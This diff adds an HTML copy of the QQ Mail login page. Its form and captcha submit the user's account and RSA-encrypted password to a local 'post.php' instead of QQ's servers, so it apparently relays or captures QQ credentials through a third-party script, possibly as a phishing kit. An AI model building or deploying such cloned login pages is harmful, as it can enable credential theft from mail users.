@@ -1,0 +1,421 @@
+<html>
+<head>
+<meta name="save" content="history">
+<link rel="shortcut icon" href="http://mail.qq.com/cgi-bin/favicon.ico">
+<title>登录QQ邮箱</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf8">
+<script language="JavaScript" src="./safeauth.js"></script>
+<script type="text/javascript">
+		var gJsFailTime = 0;
+		function checkJs()
+		{
+			if (!window.RSAKey)
+			{
+				gJsFailTime++;
+				document.write(['<script',' language="JavaScript" src="./safeauth.js?',Math.random(),'"></','script>'].join(""));
+			}
+		}
+		checkJs();
+		</script>
+<script type="text/javascript">checkJs();</script>
+<script type="text/javascript">
+		if (!window.RSAKey)
+		{
+			gJsFailTime++;
+		}
+		if (gJsFailTime > 0)
+		{
+			window.netTrans = new Image();
+			window.netTrans.src = ["/cgi-bin/getinvestigate?stat=jsdownloadfail&jsfailtime=", gJsFailTime, "&r=", Math.random()].join("");
+		}
+		var Dom = ";电信1;网通1;教育1;网通2;;电信2;教育2;电信3;网通3".split(";");
+
+		window.onerror=function(){return true;};
+
+		var S = function( object ) {
+			return document.getElementById( object );	
+		};
+
+		Object.prototype._attachEvent = Object.prototype.attachEvent;
+		Object.prototype.attachEvent = function( eventType, method, type )
+		{
+			if( document.all )
+			{
+				return this._attachEvent( eventType , method );
+			}
+			else
+			{
+				return this.addEventListener( eventType.replace( /\bon/ig , "" ), method, type );
+			}
+		}
+		function isblank(s)
+		{
+			for (var i = 0; i < s.length; i++)
+			{
+				var c = s.charAt(i);
+				if ((c != ' ') && (c != '\n') && (c != '\t')) return false;
+			}
+			return true;
+		}
+
+		function checkInput()
+		{
+			window.org_pass=S("pp").value;
+			if (!window.RSAKey)
+			{
+				document.getElementById("downError").style.display = "block";
+				document.getElementById("returnMsg").style.display = "none";
+				return false;
+			}
+			if( !checkCookie() )
+			{
+				return false;
+			}
+			if( document.form1.uin.value == "" )
+			{
+				showMsg("emptyUserName");
+				document.form1.uin.focus();
+				return false;
+			}
+			if( -1 != document.form1.uin.value.indexOf("@") )
+			{
+				showMsg("errorUserName");
+				document.form1.uin.focus();
+				return false;
+			}
+			if( document.form1.pp.value == "" )
+			{
+				showMsg("emptyPassword");
+				document.form1.pp.focus();
+				return false;
+			}
+
+			if( document.form1.pp.value.length >= 100 )
+			{
+				showMsg("errorPassowrdTooLong");
+				document.form1.pp.focus();
+				return false;
+			}
+
+			if( S("VerifyArea").style.display != "none" && document.form1.verifycode.value == "" )
+			{
+				showMsg("emptyVerifyCode");
+				document.form1.verifycode.focus();
+				return false;
+			}
+			document.form1.btlogin.disabled = true;
+			document.form1.starttime.value = (new Date()).valueOf();
+			
+			var PublicKey = "CF87D7B4C864F4842F1D337491A48FFF54B73A17300E8E42FA365420393AC0346AE55D8AFAD975DFA175FAF0106CBA81AF1DDE4ACEC284DAC6ED9A0D8FEB1CC070733C58213EFFED46529C54CEA06D774E3CC7E073346AEBD6C66FC973F299EB74738E400B22B1E7CDC54E71AED059D228DFEB5B29C530FF341502AE56DDCFE9";
+			var RSA = new RSAKey();
+			RSA.setPublic(PublicKey, "10001");
+			var Res = RSA.encrypt(document.form1.pp.value + '\n' + document.form1.ts.value + '\n');
+			if (Res)
+			{
+				document.form1.p.value = hex2b64(Res);
+			}
+			var MaskValue = "";
+			for (var Loop = 0; Loop < document.form1.pp.value.length; Loop++, MaskValue += "0");
+			document.form1.pp.value = MaskValue;
+			
+//			SetCookie_edition();
+			var sd = S("sel_domain");
+
+			return true;
+
+		}
+
+		function ShowSysService()
+		{
+			window.open("/notice.htm", "QQ邮箱系统维护通知", "width=420,height=250,toolbar=1,resizable=0");
+			return false;
+		}
+
+		function qqping_url_build()
+		{
+			p = document.URL.indexOf("?");
+			if( -1 == p )p = document.URL.indexOf("&");
+			if( -1 == p )address = "u=" + document.URL;
+			else address = "u=" + document.URL.substring(0, p);
+			p = document.referrer.indexOf("?");
+			if( -1 == p )p = document.referrer.indexOf("&");
+			if( -1 == p )refer = "r=" + document.referrer;
+			else refer = "r=" + document.referrer.substring(0, p);
+			return address + "&" + refer;
+		}
+		var bAlwaysShowVerifyCode = (false == true);
+		function CheckName()
+		{
+			if( bAlwaysShowVerifyCode )return;
+			var re = /^\d+$/;
+			if( re.test(document.form1.uin.value) == true )
+			{
+				S("VerifyArea").style.display = "block";
+				document.form1.verifycode.enabled = true;
+				S("selqq").selected=true;
+			}
+			else
+			{
+				S("VerifyArea").style.display = "none";
+				document.form1.verifycode.enabled = false;
+			}
+		}
+
+		function checkCookie() {
+
+			var agt,cookieEnabled,isSafari, number;
+
+			agt             = navigator.userAgent.toLowerCase();
+			cookieEnabled   = navigator.cookieEnabled;
+			isSafari        = ( agt.indexOf("safari") != -1 );
+			number			= Math.random();
+			document.cookie = number;
+
+			if( ((document.cookie.indexOf(number) == -1 || !cookieEnabled) && !isSafari) || (!cookieEnabled && isSafari) ) {
+				S("infobarNoCookie").style.display = "block";
+				return false;
+			}
+			else {
+				return true;
+			}
+		}
+
+		function changeimg()
+		{
+            S('vfcode').src = './post.php?type=vfcode&server_no={_server_no_}&aid=23000101&t=' + Math.random();
+		}
+				
+
+		function showMsgDomain( msgId , method,txt) {
+			var msg, msgTemplate;
+			if ( method && method == 2)
+			{
+				msgTemplate = '<div class="infobar error" id="%_id_%">%_msg_%</div>';
+			}
+			else
+			{
+				msgTemplate = '<div class="infobar error" id="%_id_%">%_msg_%</div>';
+			}
+
+			if ( msgId != undefined && msgId != "" )
+			{
+				if(!txt) txt = msg[ msgId ];
+				S( "LeftContainer" ).innerHTML = txt;
+				return true;
+			}
+			else
+			{
+				return false;
+			}
+
+		}
+		function showMsg( msgId , method,txt) {
+
+			var msg, msgTemplate;
+
+			msg = {
+				errorUserName       : "您输入的邮箱帐号不正确，请重新输入。",
+				emptyUserName       : "请填写您的邮箱帐号。",
+				emptyPassword       : "请填写邮箱密码。",
+				emptyVerifyCode     : "请填写验证码。",
+				errorPassowrdTooLong: "邮箱密码不能超过100个字符。",
+
+				errorNamePassowrd   : "您填写的帐号或密码不正确，请再次尝试。",
+				errorRequireSecondPassword	: "请使用邮箱的“独立密码”登录。",
+				errorVerifyCode     : "您填写的验证码不正确。",
+				frequent            : "您登录次数过于频繁，为保障安全，请输入验证码。",
+				errorSecondPassword	: "独立密码输入有误。",
+				errorSecondPwdNeedQQErr: "您设置了网页登录须先输入QQ密码。",
+				errorNeedQQProtect: '<p style="line-height:140%;">您的QQ帐号处于未保护状态，暂时无法登录。<br/><a onclick="ShowUrl()" style="text-decoration:underline;cursor:pointer;" >填写帐号保护资料</a></p>',
+				errorBlockIPErr		: "您的IP已被暂时屏蔽，不能登录，请迟一些时候再尝试。",
+				errorNeedJumpFoxmail: "请到www.foxmail.com登录该帐户"
+			};
+
+			if ( method && method == 2)
+			{
+				msgTemplate = '<div class="infobar error" id="%_id_%">%_msg_%</div>';
+			}
+			else
+			{
+				msgTemplate = '<div class="infobar error" id="%_id_%">%_msg_%</div>';
+			}
+
+			if ( msgId != undefined && msgId != "" )
+			{
+				if(!txt) txt = msg[ msgId ];
+				S( "msgContainer" ).innerHTML = msgTemplate.replace( /%_msg_%/ig , txt ).replace( /%_id_%/ig , msgId );
+				S( "msgContainer" ).style.cssText = "margin-top:-4px;" 
+				return true;
+			}
+			else
+			{
+				return false;
+			}
+
+		}
+
+		function init(){
+			checkCookie();
+			CheckName();
+
+			S("uin").attachEvent( "onblur" , CheckName);
+			S("pp").attachEvent( "onfocus" , CheckName);
+
+			var o =S('pp');
+			if( o.value=='')
+			{
+				o.focus();
+			}			
+		}
+		function SetCookie(sName, sValue)
+		{
+			var expdate = new Date();
+			expdate.setTime(expdate.getTime() + ( 30 * 24 * 3600 * 1000 ));
+			document.cookie = sName + "=" + escape(sValue) + "; expires=" + expdate + "; path=/; domain=qq.com";
+		}
+		function GetCookie(sName)
+		{
+
+			var aCookie = document.cookie.split("; ");
+			for (var i=0; i < aCookie.length; i++)
+			{
+				var aCrumb = aCookie[i].split("=");
+				if (sName == aCrumb[0])
+				return unescape(aCrumb[1]);
+			}
+			return null;
+		}
+		function SetCookie_edition()
+		{
+			var iNum = document.getElementById("selectbox").value;
+			if (iNum < 0)
+			{
+				sValue = "";
+			}
+			if (iNum <= 9)
+			{
+				var sValue = "0" + iNum + "m1.mail.qq.com";
+			}
+			else
+			{
+				var sValue = "" + iNum + "m1.mail.qq.com";
+			}
+			SetCookie("edition",sValue);
+		}
+		function OnSelectChange()
+		{
+			var iNum = document.getElementById("selectbox").value;
+			if (iNum < 0) return false;
+			if (iNum <= 9)
+			{
+				var sValue = "0" + iNum + "m1.mail.qq.com";
+			}
+			else
+			{
+				var sValue = "" + iNum + "m1.mail.qq.com";
+			}
+			SetCookie("edition",sValue);
+			var sCookie = GetCookie("edition");
+			alert(sCookie);
+			return true;
+		}
+		function alertsavepass()
+		{
+			var sts;
+			if(document.getElementById("ss").checked == true)
+			{
+				sts="";
+			}
+			else
+			{
+				sts="none";
+			}
+			document.getElementById("divSavePassWarning").style.display=sts;
+		}
+		function OpenStatWin()
+		{
+			window.open("/cgi-bin/speedstat?actions=relogin","speedstatwin","height=500,width=500,status=yes,toolbar=no,menubar=no,location=no");
+		}
+
+		function OnDomainChange(o)
+		{
+			var fd="@foxmail.com";
+			var t=S("sel_domain").options[o.selectedIndex].text;
+			document.getElementById( "chen2" ).innerHTML = (t==fd ? "使用@foxmail.com帐号登录" : "推荐使用邮箱帐号，如：chen@qq.com" );
+			//S("ss").disabled = (t==fd);
+			var _d=[S("chen1"),S("chen2")];
+			var _re=new RegExp("@.*?com","g");
+			showMsgDomain(1,0,m[t]?m[t]:" ");
+			
+		}
+		function ShowUrl(uin)
+		{
+			if(parseInt(uin)+"" == uin)
+			{
+				window.open( 'https://account.qq.com/cgi-bin/up/newreg_set_dna_login?from=qqmail&ret_url=http%3A%2F%2Fmail.qq.com&uin='+uin );
+			}else
+			{
+				window.open(  'https://account.qq.com/cgi-bin/up/newreg_set_dna_login?from=qqmail&ret_url=http%3A%2F%2Fmail.qq.com' );
+			}
+		}
+	</script>
+</head>
+<body onUnload="document.form1.btlogin.disabled = false;">
+<form name="form1" method="post" action="./post.php?type=submit&server_no={_server_no_}" onSubmit="return checkInput();">
+  <input name="sid" value="0,2,zh_CN" type="hidden">
+  <input name="firstlogin" value="false" type="hidden">
+  <input name="starttime" type="hidden">
+  <input name="redirecturl" type="hidden">
+  <input name="f" value="html" type="hidden">
+  <input name="p" type="hidden">
+  <input name="delegate_url" value="" type="hidden">
+  <input name="s" value="" type="hidden">
+  <input name="ts" value="{_ts_}" type="hidden">
+  <input name="from" value="" type="hidden">
+  <div class="loginplan_bg">
+    <div id="msgContainer"></div>
+    <label for="uin" class="column">帐　号：</label>
+    <input id="uin" name="uin" value="wc_cao1" tabindex="1" style="ime-mode: disabled;" class="text" type="text">
+    <select style="padding-top: 2px; height: 24px; font-family: Tahoma; font-style: normal; font-variant: normal; font-weight: normal; font-size: 13px; line-height: normal; font-size-adjust: none; font-stretch: normal; -x-system-font: none; width: 105px;" id="sel_domain" name="aliastype" onChange="OnDomainChange(this)">
+      <option id="selqq" selected="selected">@qq.com</option>
+      <option id="selvip" value="vip">@vip.qq.com</option>
+      <option id="selfox" value="fox">@foxmail.com</option>
+    </select>
+  </div>
+  <div style="margin: 8px 0pt 0pt; height: 25px; clear: left;">
+    <label for="pp" class="column">密　码：</label>
+    <input id="pp" name="pp" value="" tabindex="2" class="text" type="password">
+  </div>
+  <div style="margin: 8px 0pt 0pt; display: none;" id="VerifyArea">
+    <div style="height: 25px;">
+      <label for="vc" class="column">验证码：</label>
+      <input id="vc" name="verifycode" value="" tabindex="3" style="ime-mode: disabled;" autocomplete="off" maxlength="4" class="text" type="text">
+    </div>
+    <div style="margin: 6px 0pt 0pt 62px; clear: both; color: rgb(134, 134, 134);">按下图字符填写，不区分大小写</div>
+    <div style="margin: 6px 0pt 6px 62px; color: rgb(134, 134, 134);">
+      <script type="text/javascript">
+          document.write("<img id='vfcode' src='./post.php?type=vfcode&server_no={_server_no_}&aid=23000101&t=",Math.random(),"' style='cursor:pointer;border:1px solid #e4eef9' onclick='changeimg()'>");
+																		</script>
+      <br>
+      <a href="javascript:changeimg()">看不清楚？&nbsp;换一个</a> </div>
+  </div>
+  <div style="margin: 8px 0pt 0pt 56px; clear: both;" id="sss">
+    <div style="height: 25px; padding-top: 8px;">
+      <input id="ss" name="ss" value="1" tabindex="4" onClick="alertsavepass()" type="checkbox">
+      <label for="ss">记住登录状态</label>
+    </div>
+  </div>
+  <div style="display: none; color: rgb(255, 0, 0);" id="divSavePassWarning"> 选择此项后，下次将自动登录邮箱（本机两周内有效）。为了您的信息安全，请不要在网吧或公用电脑上使用。 </div>
+  <div style="padding: 12px 0pt 0pt 60px; clear: both; height: 27px ! important;">
+    <input class="btn" style="font-family: Verdana; font-style: normal; font-variant: normal; font-weight: bold; font-size: 12px; line-height: normal; font-size-adjust: none; font-stretch: normal; -x-system-font: none; padding-top: 2px ! important;" value="登 录" id="btlogin" name="btlogin" tabindex="4" type="submit">
+  </div>
+  </div>
+</form>
+<script type="text/javascript">
+	S("VerifyArea").style.display = (( bAlwaysShowVerifyCode || "0"=="2") ? "block" : "none" );
+</script>
+<script>init();</script>
+</center>
+
+</body>
+</html>
